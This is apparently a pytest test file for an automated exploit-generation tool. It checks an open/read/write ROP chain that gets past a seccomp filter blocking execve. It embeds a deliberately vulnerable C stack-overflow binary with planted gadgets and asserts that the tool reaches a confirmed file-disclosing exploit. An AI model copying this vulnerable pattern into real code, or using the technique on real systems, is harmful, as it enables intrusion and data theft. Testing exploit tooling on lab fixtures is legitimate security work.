"""seccomp detection + the ORW (open/read/write) L3 finisher. When a seccomp filter blocks execve,
no shell can be spawned, so the exploit stage leaks libc and runs an open()/read()/write() ROP
chain that DISCLOSES a file -- confirmed by a marker planted only in the file (never sent as input)."""
from __future__ import annotations

import struct
import subprocess

import pytest
from lykos.analyze import register
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import rop


def test_build_orw_rop_layout():
    """open/read/write ROP: read(0,scratch,path); open(scratch,0); read(3,scratch,n); write(1,..)."""
    s = rop.build_orw_rop(72, pop_rdi=0x4011aa, pop_rsi=0x4011ac, pop_rdx=0x4011ae,
                          open_fn=0x7f0000001000, read_fn=0x7f0000002000, write_fn=0x7f0000003000,
                          scratch=0x404100, path_len=16, read_len=128)
    tail = s[72:]
    w = [struct.unpack("<Q", tail[i:i + 8])[0] for i in range(0, len(tail) - 7, 8)]
    # read(0, scratch, 16)
    assert w[0:7] == [0x4011aa, 0, 0x4011ac, 0x404100, 0x4011ae, 16, 0x7f0000002000]
    # open(scratch, 0) ; read(3, scratch, 128) ; write(1, scratch, 128) all present, fd 3 assumed
    assert 0x7f0000001000 in w and 0x7f0000003000 in w and 3 in w and 1 in w


# ---------------------------------------------------------------- end-to-end (compiled) -----------
_SRC = r"""
#include <stdio.h>
#include <unistd.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
/* seccomp-BPF: allow everything except execve/execveat -> kill. The classic ORW scenario. */
static void install_seccomp(void){
    struct sock_filter f[] = {
        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, __NR_execve, 2, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, __NR_execveat, 1, 0),
        BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_KILL_PROCESS),
    };
    struct sock_fprog prog = { .len = sizeof f/sizeof f[0], .filter = f };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
__attribute__((used)) void g1(void){ __asm__ volatile(".byte 0x5f, 0xc3"); } /* pop rdi;ret */
__attribute__((used)) void g2(void){ __asm__ volatile(".byte 0x5e, 0xc3"); } /* pop rsi;ret */
__attribute__((used)) void g3(void){ __asm__ volatile(".byte 0x5a, 0xc3"); } /* pop rdx;ret */
void vuln(void){ char b[64]; read(0,b,400); }
int main(void){ setbuf(stdout,0); install_seccomp(); puts("ready"); vuln(); return 0; }
"""


@pytest.fixture
def seccomp_bin(gcc, tmp_path_factory):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("ORW exploit is x86-64 native only")
    d = tmp_path_factory.mktemp("orw")
    (d / "v.c").write_text(_SRC)
    exe = d / "v"
    r = subprocess.run([gcc, "-O0", "-fno-stack-protector", "-no-pie", "-w",
                        str(d / "v.c"), "-o", str(exe)], capture_output=True)
    if r.returncode != 0:
        pytest.skip("cannot build seccomp fixture (needs linux/seccomp.h headers)")
    return exe


def test_seccomp_detected(seccomp_bin):
    from lykos.analyze import elf
    info = elf.parse(seccomp_bin.read_bytes())
    assert info.mitigations.get("seccomp") == "on"      # prctl(PR_SET_SECCOMP) importer


def test_orw_discloses_file_past_seccomp(store, case, seccomp_bin):
    """End-to-end: a seccomp target that blocks execve is driven to a CONFIRMED L3 ORW exploit that
    opens+reads a file and writes it out. strategy=auto, no analyst params."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.analyze.poc.primitive_stage import enqueue_primitive
    from lykos.analyze.poc.stage import enqueue_build_poc
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, case.id, seccomp_bin, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True); assert pool.wait_idle(40)
        assert (store.targets.get(t.id).mitigations or {}).get("seccomp") == "on"
        sha = store.put_artifact(case.id, "seed", data=b"A" * 200).sha256
        enqueue_build_poc(q, t, params={"input_sha": sha, "input_mode": "stdin", "timeout": 20},
                          force=True); assert pool.wait_idle(120)
        enqueue_primitive(q, t, params={"input_sha": sha, "input_mode": "stdin", "timeout": 20},
                          force=True); assert pool.wait_idle(180)
        enqueue_exploit(q, t, params={"input_mode": "stdin", "timeout": 25}); assert pool.wait_idle(240)
        pocs = PocDAO(store.conn).list_by_target(t.id)
        assert any(pc.level == "L3" and pc.verified for pc in pocs), \
            f"no confirmed L3 ORW (pocs={[(p.level, p.verified) for p in pocs]})"
    finally:
        pool.stop(grace=3.0)
